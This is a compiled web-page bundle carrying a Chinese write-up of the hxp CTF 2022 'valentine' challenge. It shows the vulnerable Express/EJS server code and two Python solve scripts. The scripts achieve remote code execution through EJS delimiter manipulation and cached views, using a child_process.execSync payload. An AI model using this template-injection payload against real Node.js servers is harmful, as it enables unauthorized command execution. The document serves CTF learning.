import{_ as t,r as p,o as e,c as o,a as n,b as s,d as c,e as u}from"./app-R-nj5o9Q.js";const i={},l=n("p",null,"#RCE",-1),r={href:"https://hxp.io/blog/101/hxp-CTF-2022-valentine/",target:"_blank",rel:"noopener noreferrer"},k=u(`<p>默认的 NodeJS RCE，它读取/flag：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>&lt;.-
global.process.mainModule.constructor._load(\`child_process\`).execSync(\`/readflag\`).toString()
.&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 Dockerfile 中，节点环境设置为生产环境。</p><div class="language-Dockerfile line-numbers-mode" data-ext="Dockerfile"><pre class="language-Dockerfile"><code>ENV NODE_ENV=production
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这会导致快速缓存视图。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>env <span class="token operator">===</span> <span class="token string">&quot;production&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token string">&quot;view cache&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于 POST 请求直接重定向到没有分隔符的模板，因此将缓存默认分隔符<code>%</code>，以后无法覆盖。</p><p>但可以禁止重定向：</p><ul><li>Python：<code>requests.port(..., allow_redirects=False)</code></li><li>Firefox: set <code>network.http.redirection-limit</code> to <code>1</code> in <code>about:config</code></li></ul><p>如果随后使用<code>delimiter=.</code>访问站点，则将在模板中使用新的<code>delimiter</code>。</p><h2 id="pwn-py" tabindex="-1"><a class="header-anchor" href="#pwn-py" aria-hidden="true">#</a> pwn.py</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

HOST <span class="token operator">=</span> <span class="token string">&quot;TODO&quot;</span>
PORT <span class="token operator">=</span> TODO

<span class="token comment"># write template</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    <span class="token string-interpolation"><span class="token string">f&quot;http://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>PORT<span class="token punctuation">}</span></span><span class="token string">/template&quot;</span></span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">&quot;tmpl&quot;</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;.- global.process.mainModule.constructor._load(\`child_process\`).execSync(\`/readflag\`).toString() .&gt;&quot;&quot;&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>

<span class="token comment"># change delimiter</span>
m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&quot;Redirecting to /(?P&lt;uuid&gt;.*)?name=&quot;</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;http://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>PORT<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">&#39;uuid&#39;</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">?name=a&amp;delimiter=.&quot;</span></span><span class="token punctuation">)</span>
m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&quot;hxp\\{[^}]+\\}&quot;</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>另一种</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
tmpl <span class="token operator">=</span> <span class="token punctuation">(</span>
    <span class="token string">&quot;flag: &lt;$= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;../readflag&#39;) $&gt;&quot;</span>
<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url <span class="token operator">+</span> <span class="token string">&quot;/template&quot;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;tmpl&quot;</span><span class="token punctuation">:</span> tmpl<span class="token punctuation">,</span> <span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;gork&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span>
<span class="token punctuation">)</span>
redirect <span class="token operator">=</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&quot;location&quot;</span><span class="token punctuation">]</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> redirect <span class="token operator">+</span> <span class="token string">&quot;&amp;delimiter=$&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>个人理解</p><p>app.py</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>var express <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">&#39;express&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var bodyParser <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">&#39;body-parser&#39;</span><span class="token punctuation">)</span>
const crypto <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">&quot;crypto&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var path <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">&#39;path&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const fs <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">&#39;fs&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

var app <span class="token operator">=</span> express<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
viewsFolder <span class="token operator">=</span> path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">&#39;views&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>!fs<span class="token punctuation">.</span>existsSync<span class="token punctuation">(</span>viewsFolder<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  fs<span class="token punctuation">.</span>mkdirSync<span class="token punctuation">(</span>viewsFolder<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

app<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">&#39;views&#39;</span><span class="token punctuation">,</span> viewsFolder<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">&#39;view engine&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;ejs&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span>use<span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span>urlencoded<span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> false <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&#39;/template&#39;</span><span class="token punctuation">,</span> function <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  let tmpl <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>tmpl<span class="token punctuation">;</span>
  let i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">=</span> tmpl<span class="token punctuation">.</span>indexOf<span class="token punctuation">(</span><span class="token string">&quot;&lt;%&quot;</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpl<span class="token punctuation">.</span>substring<span class="token punctuation">(</span>i<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">&quot;&lt;%= name %&gt;&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token punctuation">:</span> <span class="token string">&quot;Only &#39;&lt;%= name %&gt;&#39; is allowed.&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  let uuid<span class="token punctuation">;</span>
  do <span class="token punctuation">{</span>
    uuid <span class="token operator">=</span> crypto<span class="token punctuation">.</span>randomUUID<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span>existsSync<span class="token punctuation">(</span>\`views<span class="token operator">/</span>$<span class="token punctuation">{</span>uuid<span class="token punctuation">}</span><span class="token punctuation">.</span>ejs\`<span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    fs<span class="token punctuation">.</span>writeFileSync<span class="token punctuation">(</span>\`views<span class="token operator">/</span>$<span class="token punctuation">{</span>uuid<span class="token punctuation">}</span><span class="token punctuation">.</span>ejs\`<span class="token punctuation">,</span> tmpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> catch <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;Failed to write Valentine&#39;s card&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  let name <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>name ?? <span class="token string">&#39;&#39;</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>\`<span class="token operator">/</span>$<span class="token punctuation">{</span>uuid<span class="token punctuation">}</span>?name<span class="token operator">=</span>$<span class="token punctuation">{</span>name<span class="token punctuation">}</span>\`<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;/:template&#39;</span><span class="token punctuation">,</span> function <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  let query <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
  let template <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>template
  <span class="token keyword">if</span> <span class="token punctuation">(</span>!<span class="token operator">/</span><span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9A<span class="token operator">-</span>F<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9A<span class="token operator">-</span>F<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9A<span class="token operator">-</span>F<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">[</span>89AB<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9A<span class="token operator">-</span>F<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9A<span class="token operator">-</span>F<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">12</span><span class="token punctuation">}</span>$<span class="token operator">/</span>i<span class="token punctuation">.</span>test<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;Not a valid card id&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>!fs<span class="token punctuation">.</span>existsSync<span class="token punctuation">(</span>\`views<span class="token operator">/</span>$<span class="token punctuation">{</span>template<span class="token punctuation">}</span><span class="token punctuation">.</span>ejs\`<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&#39;Valentine\\&#39;s card does not exist&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>!query<span class="token punctuation">[</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    query<span class="token punctuation">[</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> res<span class="token punctuation">.</span>render<span class="token punctuation">(</span>template<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> function <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> res<span class="token punctuation">.</span>sendFile<span class="token punctuation">(</span><span class="token string">&#39;./index.html&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> root<span class="token punctuation">:</span> __dirname <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>PORT <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先， /template 传递的 tml 会根据 <code>&lt;%</code> 匹配 &lt;%= name %&gt;，上面的两个脚本是不同的方式</p><p>一个是在开始就修改 delimiter,另一个是重定向时修改 delimiter。</p><p>至于这个命令</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor
  <span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">\`</span><span class="token string">child_process</span><span class="token template-punctuation string">\`</span></span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">\`</span><span class="token string">/readflag</span><span class="token template-punctuation string">\`</span></span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>是用到了原型链以及 nodejs child_process 模块相关的内容</p>`,22);function d(v,m){const a=p("ExternalLinkIcon");return e(),o("div",null,[l,n("p",null,[s("原文："),n("a",r,[s("hxp | hxp CTF 2022: valentine"),c(a)])]),k])}const g=t(i,[["render",d],["__file","valentine.html.vue"]]);export{g as default};
